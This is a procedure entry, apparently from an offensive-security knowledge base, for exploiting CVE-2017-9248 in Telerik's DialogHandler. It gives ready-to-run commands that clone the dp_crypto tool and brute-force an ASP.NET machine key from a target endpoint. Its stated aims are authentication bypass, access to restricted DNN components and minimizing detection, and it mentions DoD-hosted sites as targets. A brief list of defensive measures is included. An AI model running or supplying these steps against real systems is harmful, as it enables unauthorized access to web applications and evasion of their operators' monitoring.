---
id: proc-uuid-2
tags:
  - brute-force
  - telerik
  - asp-net
  - machine-key
type: procedure
tools:
  - '[[tools/dp-crypto]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/dp-crypto-brute-force-machine-key]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:28.498Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Exploit Public-Facing Application]]'
---
# Brute-Force-ASP-NET-Machine-Key-Using-dp-crypto

## Summary

This procedure uses the dp_crypto Python script to brute-force the 88-character ASCII ASP.NET machine key from the vulnerable Telerik DialogHandler endpoint, exploiting CVE-2017-9248 to decrypt and access protected resources like the DNN file manager.

## Description

The Telerik DialogHandler in versions ≤2017.1.118 uses a weak cryptographic implementation for the machine key, allowing brute-force attacks over the network. This procedure clones the dp_crypto tool, configures it for the target, and runs a multi-threaded brute-force to recover the key, which is then usable for generating authenticated links. It targets DoD-hosted DNN sites but applies to any unpatched setup.

## Requirements

1. Python 3 environment installed
2. Git to clone the dp_crypto repository
3. Network access to the target DialogHandler URL
4. Confirmed vulnerability from prior recon

## Defense

Defensive measures and detection strategies:

- Rotate machine keys regularly and use strong entropy
- Rate-limit requests to DialogHandler endpoints
- Deploy IDS/IPS to detect brute-force patterns (high request volume to specific paths)
- Audit Telerik patches and disable unused providers

## Objectives

1. Recover the machine key for authentication bypass
2. Enable access to restricted DNN components
3. Minimize detection during brute-force

## Instructions

### Step 1: Clone and Prepare dp_crypto

**Context**: Download the tool from GitHub to set up the brute-force environment.

**Command** (git clone):
```bash
git clone https://github.com/bao7uo/dp_crypto
cd dp_crypto
```

> This fetches the Python script. Ensure dependencies like requests library are installed via pip if needed.

### Step 2: Execute Brute-Force

**Context**: Run the script against the target with parameters for key length, charset, and threads.

**Command** ([[commands/dp-crypto-brute-force-machine-key]]):
```bash
python dp_crypto.py -k https://target/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx 88 all 21
```

> The script attempts combinations using full ASCII ("all"), 88-character length, and 21 threads for speed. Monitor progress; success yields the key.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Brute Force]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/dp-crypto-brute-force-machine-key]]

## Tools Used

- [[tools/dp-crypto]]

## Tags

- [[brute-force]]
- [[telerik]]
- [[asp-net]]
